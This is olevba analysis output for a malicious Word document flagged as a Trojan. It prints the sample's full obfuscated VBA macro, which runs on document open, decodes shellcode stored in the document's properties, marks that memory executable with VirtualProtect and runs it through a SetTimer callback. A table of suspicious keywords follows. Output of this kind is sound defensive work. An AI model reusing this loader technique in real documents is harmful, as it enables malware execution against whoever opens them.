olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-784079ee129a867c6b02cac923322520e04a4afa91a8e5560c857bc4d9165423
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-784079ee129a867c6b02cac923322520e04a4afa91a8e5560c857bc4d9165423 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function BrimmingRestabilizing Lib "user32" Alias "SetTimer" (ByVal CaretakenWailful As LongPtr, ByVal AntroscopeDacryoma As LongPtr, ByVal WinninglyTorulusCushy As LongPtr, ByVal CiliolaInhumerTeasers As LongPtr) As LongPtr
Private Declare PtrSafe Function PhaeosporalesItinerantUnhomologic Lib "user32" Alias "KillTimer" (ByVal SatellitarianMokihi As LongPtr, ByVal UncontrovertableActinoliticTongkang As LongPtr) As LongPtr
Private Declare PtrSafe Function FaultingDysacousiaCementum Lib "kernel32" Alias "VirtualProtect" (ByVal OverdefensivelyStuccoingExonerated As LongPtr, ByVal TreponemataParallelingPhytopathologic As LongPtr, ByVal ConventionalisingAnodically As LongPtr, EggshellConcarnation As LongPtr) As LongPtr
#Else
Private Declare Function BrimmingRestabilizing Lib "user32" Alias "SetTimer" ( ByVal LooneryGlycocinMelanosarcomatosis As Long, ByVal NymphomaniacCaucus As Long, ByVal ProffererImploration As Long, ByVal BelongedVirologic As Any) As Long
Private Declare Function PhaeosporalesItinerantUnhomologic Lib "user32" Alias "KillTimer" ( ByVal ElectroencephalogramsAcclimatizePleasingness As Long, ByVal NiflingInteralliance As Long) As Long
Private Declare Function FaultingDysacousiaCementum Lib "kernel32" Alias "VirtualProtect"  (ByVal KeyboardPersonalisationImpowers As Long, ByVal AmirayGuernseyedNondense As Long, ByVal SubantiquelyVacuousnessPycnid As Long, DevelopmentarianWindburns As Long) As Long
#End If
Private Sub Document_Open()
Dim OfficPeeing() As Byte
#If Win64 Then
OfficPeeing = EphphathaStunting(ActiveDocument.BuiltInDocumentProperties(FvPdjaitt("RIILdBqjLS")).Value)
#Else
OfficPeeing = EphphathaStunting(ActiveDocument.BuiltInDocumentProperties(FvPdjaitt("FbSexuHOPR")).Value)
#End If
#If VBA7 Then
Dim PsychodynamicsBackstitchesNoncurling As LongPtr
Dim IrredentismOutservingCustumal As LongPtr
Dim shellCode As LongPtr
Dim PagrusOleates As LongPtr
#Else
Dim PsychodynamicsBackstitchesNoncurling As Long
Dim IrredentismOutservingCustumal As Long
Dim shellCode As Long
Dim PagrusOleates As Long
#End If
IrredentismOutservingCustumal = UBound(OfficPeeing) + 1
shellCode = VarPtr(OfficPeeing(0))
FaultingDysacousiaCementum shellCode, IrredentismOutservingCustumal, 64, VarPtr(PsychodynamicsBackstitchesNoncurling)
GetObject(FvPdjaitt("CburUioNvOK")).Environment(FvPdjaitt("YECio4naWHE"))(FvPdjaitt("OHb6fbqReh")) = ActiveDocument.FullName
GetObject(FvPdjaitt("gdw4w9q")).Environment(FvPdjaitt("rs83M2G"))(FvPdjaitt("g5Gib7")) = FvPdjaitt("PGmkziJpwZN")
PagrusOleates = BrimmingRestabilizing(0, shellCode, 1, shellCode)
SuchnessesBuddhiMessuages 1
PhaeosporalesItinerantUnhomologic 0, PagrusOleates
GetObject(FvPdjaitt("kz23Dj6pM")).Environment(FvPdjaitt("TVRYRpoEp")).Remove (FvPdjaitt("nGUrQM8XkW"))
GetObject(FvPdjaitt("nHXbK9fg")).Environment(FvPdjaitt("BLCZdtmRj0")).Remove (FvPdjaitt("B47Tmdxvt"))
ReDim OfficPeeing(1)
End Sub
Sub SuchnessesBuddhiMessuages(Finish)
Dim MyxemiaDeduction As Long
Dim AcclaimableQuaintish As Long
AcclaimableQuaintish = Timer() + (Finish)
Do
MyxemiaDeduction = Timer()
DoEvents
Loop Until MyxemiaDeduction > AcclaimableQuaintish
End Sub
Function ComplicitousDianite(ReferralsRecurvariaTargumic, OunceAngelological)
ComplicitousDianite = Mid(ReferralsRecurvariaTargumic, OunceAngelological + 1, 1)
End Function
Function ToupetDuplone(UnfumbledTenoreSkelf) As Long
If Int(Rnd(23)) > 2 Then
ToupetDuplone = 9000
Else
ToupetDuplone = Len(UnfumbledTenoreSkelf)
End If
End Function
Function EphphathaStunting(MyxedemasSandbin)
ReDim OdontographicGrosbeak(ToupetDuplone(MyxedemasSandbin) - 1) As Byte
Dim SubsultusRenishlyAltars As Long, PruinoseAntimaskerSyngenetic As Long
Dim SorusSaeta: SorusSaeta = FvPdjaitt("stBYhk8g") & FvPdjaitt("gICHRhp0")
For SubsultusRenishlyAltars = 0 To ToupetDuplone(MyxedemasSandbin) - 1 Step 2
PruinoseAntimaskerSyngenetic = SubsultusRenishlyAltars / 2
OdontographicGrosbeak(PruinoseAntimaskerSyngenetic) = CDec(SorusSaeta & ComplicitousDianite(MyxedemasSandbin, SubsultusRenishlyAltars) & ComplicitousDianite(MyxedemasSandbin, SubsultusRenishlyAltars + 1))
Next
EphphathaStunting = OdontographicGrosbeak
End Function
Public Function FvPdjaitt(strInput)
FvPdjaitt = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

